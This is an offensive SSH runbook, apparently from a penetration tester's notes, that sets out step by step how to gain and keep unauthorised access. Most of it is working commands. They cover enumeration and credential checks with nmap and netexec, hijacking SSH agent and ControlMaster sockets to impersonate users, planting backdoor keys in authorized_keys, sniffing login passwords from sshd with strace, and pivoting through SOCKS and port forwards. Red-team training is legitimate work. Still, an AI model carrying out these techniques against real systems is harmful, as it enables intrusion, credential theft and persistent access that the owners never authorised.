---
tags: [protocol, ssh, linux, lateral-movement, persistence, tunneling]
---

# 🔑 SSH Protocol Runbook (400/500 Level)

> [!ABSTRACT]
> This runbook covers Secure Shell (SSH) from initial access to advanced persistence and agent hijacking.
> **Goal**: Secure a persistent foothold, move laterally via trusted keys, and hijack active sessions.

---

## 🔍 Phase 1: Recon & Enumeration

### 1. Identify SSH (nmap/netexec)
```bash
# General Info (Nmap)
nmap -p 22 <TARGET> -sV --script ssh-auth-methods,ssh-hostkey

# Check Credentials (netexec)
netexec ssh <TARGET> -u <USER> -p <PASS>
netexec ssh <TARGET> -u <USER> --key-file id_rsa
```

---

## 🚀 Phase 2: Advanced Authentication & Hijacking (400/500 Level)

### 1. SSH Agent Hijacking (Lateral Movement)
If a user is logged in with an active SSH agent, you can use their identity to connect to other hosts.
```bash
# 1. Find Agent Sockets (Requires root or the user context)
find /tmp -name "agent.*" 2>/dev/null

# 2. Hijack the Socket
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXXX

# 3. Test Access
ssh-add -l                                   # List keys in agent
ssh <USER>@<INTERNAL_TARGET>                 # Authenticate as the victim
```

### 2. ControlMaster Hijacking (Session Persistence)
If `ControlMaster` is enabled, you can hijack existing SSH connections.
```bash
# Check if a control socket exists
ls ~/.ssh/control/

# Hijack the connection to run a command
ssh -S ~/.ssh/control/<SOCKET_NAME> <TARGET> 'whoami'
```

---

## 🛠️ Phase 3: Persistence & Backdoors

### 1. Writable `authorized_keys`
The most stable persistence method on Linux.
```bash
# Append your key
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Advanced: Restricted Command Backdoor
# (Only allows your key to run a specific command/script)
echo 'command="/tmp/backdoor.sh" ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys
```

### 2. Password Sniffing (`strace`)
If you are root, you can sniff SSH passwords as users log in.
```bash
# Sniff password from sshd process
ps aux | grep sshd
strace -p <SSHD_PID> -f -e trace=read,write -s 128 2>&1 | grep "password"
```

---

## 🚇 Phase 4: Tunneling & Pivoting
*Detailed guide in [[Pivoting & Tunneling]]*

```bash
# Dynamic SOCKS Proxy (Kali:1080 -> Target Network)
ssh -D 1080 -N -f <USER>@<PIVOT_IP>

# Local Port Forward (Kali:8080 -> Internal:80)
ssh -L 8080:<INTERNAL_IP>:80 <USER>@<PIVOT_IP>
```

---

## 🔗 Related Notes
- [[Linux Privilege Escalation]] - For gaining root to hijack agents.
- [[Admin Reference]] - For SSH key generation and deployment.
- [[Pivoting & Tunneling]] - For advanced multi-hop SSH chains.
- [[File Transfer]] - For moving keys and binaries over SSH/SCP.
